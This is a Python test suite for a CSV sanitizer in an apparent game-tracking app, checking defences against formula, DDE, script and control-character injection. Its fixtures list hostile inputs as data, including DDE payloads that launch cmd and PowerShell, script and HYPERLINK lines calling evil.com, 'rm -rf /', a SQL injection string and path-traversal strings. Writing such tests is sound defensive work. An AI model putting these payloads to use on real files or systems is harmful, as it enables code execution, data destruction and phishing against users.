"""
Comprehensive tests for CSV injection prevention.

This test suite validates that the CSVSanitizer properly prevents all known
CSV injection attack vectors including formula injection, script injection,
DDE attacks, and other malicious content.

Reference:
- OWASP CSV Injection: https://owasp.org/www-community/attacks/CSV_Injection
- CWE-1236: Improper Neutralization of Formula Elements in CSV Files
"""

import pytest
from typing import List

from app.security.csv_sanitizer import CSVSanitizer


class TestCSVSanitizer:
    """Test cases for CSV injection prevention."""
    
    @pytest.fixture
    def dangerous_formula_inputs(self) -> List[str]:
        """Provide dangerous formula inputs for testing."""
        return [
            # Basic formula injections
            "=1+1",
            "@SUM(A1:A10)",
            "+1+1", 
            "-1+1",
            
            # Command execution attempts
            "=cmd|'/c calc'!A1",
            "=1+1+cmd|'/c calc'!A1",
            "@SUM(cmd|'/c notepad'!A1:A2)",
            
            # DDE (Dynamic Data Exchange) attacks
            "=cmd|' /C notepad'!A0",
            "=2+2+cmd|' /C calc'!A0",
            "@SUM(cmd|'/c powershell -exec bypass -c whoami'!A1)",
            
            # Hyperlink attacks
            '=HYPERLINK("http://evil.com","Click me!")',
            '=HYPERLINK("javascript:alert(\'XSS\')","Click")',
            
            # Tab and carriage return prefixes
            "\t=1+1",
            "\r=SUM(A1:A10)",
            
            # Complex nested formulas
            "=IF(1=1,cmd|'/c calc'!A1,0)",
            "=CONCATENATE(cmd|'/c',\" calc\")&\"!A1\"",
        ]
    
    @pytest.fixture 
    def dangerous_script_inputs(self) -> List[str]:
        """Provide dangerous script inputs for testing."""
        return [
            # HTML script tags
            "<script>alert('XSS')</script>",
            "<script src='http://evil.com/malicious.js'></script>",
            "<script type='text/javascript'>window.location='http://evil.com'</script>",
            
            # JavaScript URLs
            "javascript:alert('XSS')",
            "javascript:document.location='http://evil.com'",
            "JavaScript:void(0)",
            
            # VBScript
            "vbscript:msgbox('XSS')",
            "VBScript:CreateObject('Shell.Application').ShellExecute('calc')",
            
            # Data URLs
            "data:text/html,<script>alert('XSS')</script>",
            "data:application/javascript,alert('XSS')",
            
            # Other dangerous HTML elements
            "<iframe src='http://evil.com'></iframe>",
            "<embed src='http://evil.com/malware.swf'>",
            "<object data='http://evil.com/malware.pdf'>",
            "<link rel='stylesheet' href='http://evil.com/malicious.css'>",
            "<meta http-equiv='refresh' content='0;url=http://evil.com'>",
            
            # Command injection patterns
            "cmd|'/c calc'",
            "|cmd /c notepad", 
            "powershell -exec bypass",
            "system('rm -rf /')",
        ]
    
    @pytest.fixture
    def dangerous_control_chars(self) -> List[str]:
        """Provide inputs with dangerous control characters."""
        return [
            # Null bytes
            "normal_text\x00malicious",
            "game\x00'; DROP TABLE games; --",
            
            # Other control characters
            "text\x01\x02\x03",
            "data\x08\x0B\x0C",  # Backspace, vertical tab, form feed
            "content\x0E\x0F",   # Shift out/in
            "input\x7F\x80\x9F", # DEL and extended control chars
            
            # Path traversal with null bytes
            "../../../etc/passwd\x00.jpg",
            "..\\..\\windows\\system32\\cmd.exe\x00",
        ]
    
    def test_formula_injection_prevention(self, dangerous_formula_inputs):
        """Test that formula injection attacks are properly prevented."""
        for dangerous_input in dangerous_formula_inputs:
            sanitized = CSVSanitizer.sanitize_cell(dangerous_input)
            
            # Should be prefixed with quote to prevent execution
            assert sanitized.startswith("'"), f"Formula not properly escaped: {dangerous_input}"
            
            # Should not start with dangerous prefixes after sanitization
            for prefix in CSVSanitizer.FORMULA_PREFIXES:
                assert not sanitized.startswith(prefix), f"Dangerous prefix not removed: {dangerous_input}"
    
    def test_script_injection_prevention(self, dangerous_script_inputs):
        """Test that script injection attacks are properly prevented."""
        for dangerous_input in dangerous_script_inputs:
            sanitized = CSVSanitizer.sanitize_cell(dangerous_input)
            
            # Should not contain script patterns
            for pattern in CSVSanitizer.SCRIPT_PATTERNS:
                assert not pattern.search(sanitized), f"Script pattern not removed: {dangerous_input}"
            
            # Should be HTML escaped OR completely removed (removal is better)
            dangerous_chars = ['<', '>', '"', "'"]
            if any(char in dangerous_input for char in dangerous_chars):
                # Either HTML escaping should have occurred OR dangerous content should be removed
                has_html_escaping = ('&lt;' in sanitized or '&gt;' in sanitized or 
                                   '&quot;' in sanitized or '&#x27;' in sanitized)
                is_empty_or_safe = len(sanitized.strip()) == 0 or not any(char in sanitized for char in dangerous_chars)
                assert has_html_escaping or is_empty_or_safe, f"Dangerous content not properly handled: {dangerous_input} -> {sanitized}"
    
    def test_control_character_removal(self, dangerous_control_chars):
        """Test that control characters are properly removed."""
        for dangerous_input in dangerous_control_chars:
            sanitized = CSVSanitizer.sanitize_cell(dangerous_input)
            
            # Should not contain null bytes
            assert '\x00' not in sanitized, f"Null byte not removed: {dangerous_input}"
            
            # Should not contain other dangerous control characters
            for i in range(32):
                if i not in [9, 10, 13]:  # Allow tab, newline, carriage return
                    char = chr(i)
                    if char in dangerous_input:
                        assert char not in sanitized, f"Control character {repr(char)} not removed"
    
    def test_safe_inputs_unchanged(self):
        """Test that safe inputs are not unnecessarily modified."""
        safe_inputs = [
            "Portal 2",
            "The Legend of Zelda: Breath of the Wild", 
            "Half-Life 2: Episode Two",
            "Mass Effect 3: Citadel DLC",
            "Grand Theft Auto: Vice City",
            "Call of Duty: Modern Warfare (2019)",
            "Counter-Strike: Global Offensive",
            "Tom Clancy's Rainbow Six Siege",
            "Assassin's Creed: Brotherhood",
            "The Elder Scrolls V: Skyrim - Special Edition"
        ]
        
        for safe_input in safe_inputs:
            sanitized = CSVSanitizer.sanitize_cell(safe_input)
            # Should be unchanged except for potential HTML escaping of quotes
            # For game titles, this should generally be minimal changes
            assert len(sanitized) >= len(safe_input) * 0.9, f"Safe input excessively modified: {safe_input}"
    
    def test_empty_and_none_values(self):
        """Test handling of empty and None values."""
        test_cases = [
            None,
            "",
            " ",
            "   ",
            "\t",
            "\n",
        ]
        
        for test_case in test_cases:
            sanitized = CSVSanitizer.sanitize_cell(test_case)
            assert isinstance(sanitized, str), f"Should return string for: {repr(test_case)}"
            if test_case in [None, ""]:
                assert sanitized == "", f"Should return empty string for: {repr(test_case)}"
    
    def test_length_limits(self):
        """Test that cell length limits are enforced."""
        # Create a very long string
        long_string = "A" * (CSVSanitizer.MAX_CELL_LENGTH + 1000)
        
        sanitized = CSVSanitizer.sanitize_cell(long_string)
        
        assert len(sanitized) <= CSVSanitizer.MAX_CELL_LENGTH, "Cell length limit not enforced"
    
    def test_is_potentially_dangerous(self, dangerous_formula_inputs, dangerous_script_inputs):
        """Test the dangerous content detection function."""
        # Test dangerous inputs
        all_dangerous = dangerous_formula_inputs + dangerous_script_inputs
        for dangerous_input in all_dangerous:
            assert CSVSanitizer.is_potentially_dangerous(dangerous_input), f"Should detect as dangerous: {dangerous_input}"
        
        # Test safe inputs
        safe_inputs = ["Portal", "Half-Life 2", "normal text", "123", ""]
        for safe_input in safe_inputs:
            assert not CSVSanitizer.is_potentially_dangerous(safe_input), f"Should not detect as dangerous: {safe_input}"
    
    def test_sanitize_row(self):
        """Test row-level sanitization."""
        dangerous_row = {
            "game_name": "Portal",
            "rating": "=1+1", 
            "notes": "<script>alert('XSS')</script>",
            "platform": "PC",
            "=malicious_column": "test"  # Dangerous column name
        }
        
        sanitized_row = CSVSanitizer.sanitize_row(dangerous_row)
        
        # Check that values are sanitized
        assert sanitized_row["rating"].startswith("'"), "Formula not escaped in row"
        assert "<script>" not in sanitized_row["notes"], "Script not removed in row"
        
        # Check that column names are sanitized
        dangerous_col_found = False
        for col_name in sanitized_row.keys():
            if col_name.startswith("="):
                dangerous_col_found = True
                break
        assert not dangerous_col_found, "Dangerous column name not sanitized"
        
        # Safe values should be preserved
        assert sanitized_row["game_name"] == "Portal", "Safe value modified"
        assert sanitized_row["platform"] == "PC", "Safe value modified"
    
    def test_sanitize_csv_data_with_stats(self):
        """Test full CSV sanitization with statistics tracking."""
        csv_data = [
            {"game": "Portal", "rating": "9", "notes": "Great game"},
            {"game": "Test", "rating": "=1+1", "notes": "<script>alert('xss')</script>"},
            {"game": "Another", "rating": "+2+2", "notes": "Normal notes"},
        ]
        
        sanitized_data, stats = CSVSanitizer.sanitize_csv_data(csv_data)
        
        # Check statistics
        assert stats.total_cells == 9, f"Expected 9 cells, got {stats.total_cells}"
        assert stats.formula_injections_prevented >= 2, "Should detect formula injections"
        assert stats.script_injections_prevented >= 1, "Should detect script injection"
        
        # Check sanitized data structure
        assert len(sanitized_data) == 3, "Should preserve all rows"
        assert all(len(row) == 3 for row in sanitized_data), "Should preserve all columns"
        
        # Check that dangerous content is sanitized
        formula_row = sanitized_data[1]
        assert formula_row["rating"].startswith("'"), "Formula not escaped"
    
    def test_validate_csv_safety_strict_mode(self):
        """Test CSV safety validation in strict mode."""
        safe_data = [
            {"game": "Portal", "rating": "9"},
            {"game": "Half-Life", "rating": "10"}
        ]
        
        dangerous_data = [
            {"game": "Portal", "rating": "9"},
            {"game": "Test", "rating": "=1+1"}  # Contains formula
        ]
        
        # Safe data should pass
        is_safe, issues = CSVSanitizer.validate_csv_safety(safe_data, strict=True)
        assert is_safe, "Safe data should pass validation"
        assert len(issues) == 0, "Safe data should have no issues"
        
        # Dangerous data should fail in strict mode
        is_safe, issues = CSVSanitizer.validate_csv_safety(dangerous_data, strict=True)
        assert not is_safe, "Dangerous data should fail strict validation"
        assert len(issues) > 0, "Dangerous data should have issues reported"
    
    def test_validate_csv_safety_permissive_mode(self):
        """Test CSV safety validation in permissive mode."""
        dangerous_data = [
            {"game": "Portal", "rating": "9"},
            {"game": "Test", "rating": "=1+1"}  # Contains formula
        ]
        
        # Should still detect issues but not fail validation in permissive mode
        is_safe, issues = CSVSanitizer.validate_csv_safety(dangerous_data, strict=False)
        assert len(issues) > 0, "Should still detect issues in permissive mode"
        # Note: is_safe behavior in permissive mode depends on implementation
    
    def test_complex_injection_attempts(self):
        """Test complex, real-world injection attempts."""
        complex_attacks = [
            # Nested formula with command execution
            '=IF(1=1,cmd|"/c calc.exe",0)',
            
            # Multiple injection types combined  
            '=1+1<script>alert("XSS")</script>',
            
            # Encoded attacks
            'javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
            
            # CSV injection with social engineering
            '=cmd|"/c start http://phishing-site.com"!A1 // Click for bonus points!',
            
            # DDE with obfuscation
            '=2+5+cmd|"/C powershell.exe -WindowStyle Hidden -exec bypass -c whoami"!A1',
        ]
        
        for attack in complex_attacks:
            sanitized = CSVSanitizer.sanitize_cell(attack)
            
            # Should be made safe
            assert CSVSanitizer.is_potentially_dangerous(attack), f"Should detect as dangerous: {attack}"
            assert not CSVSanitizer.is_potentially_dangerous(sanitized), f"Should be safe after sanitization: {sanitized}"
    
    def test_performance_with_large_dataset(self):
        """Test performance with large datasets."""
        # Create a large dataset
        large_dataset = []
        for i in range(1000):
            large_dataset.append({
                "game": f"Test Game {i}",
                "rating": str(i % 10),
                "notes": f"This is a longer note for game {i} with some description text",
                "platform": "PC",
                "genre": "Action"
            })
        
        # Add some dangerous content
        large_dataset[500]["rating"] = "=1+1"
        large_dataset[750]["notes"] = "<script>alert('test')</script>"
        
        # Should complete without timeout
        import time
        start_time = time.time()
        
        sanitized_data, stats = CSVSanitizer.sanitize_csv_data(large_dataset)
        
        end_time = time.time()
        processing_time = end_time - start_time
        
        assert processing_time < 10.0, f"Processing took too long: {processing_time:.2f}s"
        assert len(sanitized_data) == 1000, "Should process all rows"
        assert stats.total_cells == 5000, "Should process all cells" 
        assert stats.formula_injections_prevented >= 1, "Should detect injections"


class TestCSVSanitizerEdgeCases:
    """Test edge cases and boundary conditions."""
    
    def test_unicode_and_special_characters(self):
        """Test handling of Unicode and special characters."""
        unicode_inputs = [
            "Pokémon Red/Blue",
            "NieR:Automata™", 
            "FINAL FANTASY® VII",
            "東京",  # Japanese
            "Москва",  # Russian
            "🎮🎯🚀",  # Emojis
            "café naïve résumé",  # Accented characters
        ]
        
        for unicode_input in unicode_inputs:
            sanitized = CSVSanitizer.sanitize_cell(unicode_input)
            
            # Should preserve Unicode characters (though may HTML escape some)
            assert len(sanitized) > 0, f"Unicode input completely removed: {unicode_input}"
            
            # Should not be flagged as dangerous
            assert not CSVSanitizer.is_potentially_dangerous(unicode_input), f"Unicode incorrectly flagged: {unicode_input}"
    
    def test_numeric_inputs(self):
        """Test handling of numeric inputs."""
        numeric_inputs = [
            0,
            42,
            -17,
            3.14159,
            float('inf'),
            float('-inf'),
        ]
        
        for numeric_input in numeric_inputs:
            sanitized = CSVSanitizer.sanitize_cell(numeric_input)
            
            assert isinstance(sanitized, str), "Should convert to string"
            assert len(sanitized) > 0, "Should not be empty"
            
            # Should not be flagged as dangerous
            assert not CSVSanitizer.is_potentially_dangerous(numeric_input), f"Numeric incorrectly flagged: {numeric_input}"
    
    def test_boolean_inputs(self):
        """Test handling of boolean inputs."""
        boolean_inputs = [True, False]
        
        for boolean_input in boolean_inputs:
            sanitized = CSVSanitizer.sanitize_cell(boolean_input)
            
            assert isinstance(sanitized, str), "Should convert to string"
            assert sanitized in ["True", "False"], f"Boolean not properly converted: {boolean_input}"
    
    def test_whitespace_handling(self):
        """Test handling of various whitespace scenarios."""
        whitespace_cases = [
            "  =1+1  ",  # Formula with surrounding whitespace
            "\t<script>alert('xss')</script>\n",  # Script with whitespace
            "   normal text   ",  # Safe text with whitespace
            "text\nwith\nnewlines",  # Internal newlines
            "text\twith\ttabs",  # Internal tabs
        ]
        
        for case in whitespace_cases:
            sanitized = CSVSanitizer.sanitize_cell(case)
            
            # Should handle whitespace appropriately
            assert isinstance(sanitized, str), "Should return string"
            
            # Dangerous content should still be caught even with whitespace
            if case.strip().startswith("=") or "<script>" in case:
                assert (sanitized.startswith("'") or 
                       "script" not in sanitized.lower()), f"Dangerous content not handled: {case}"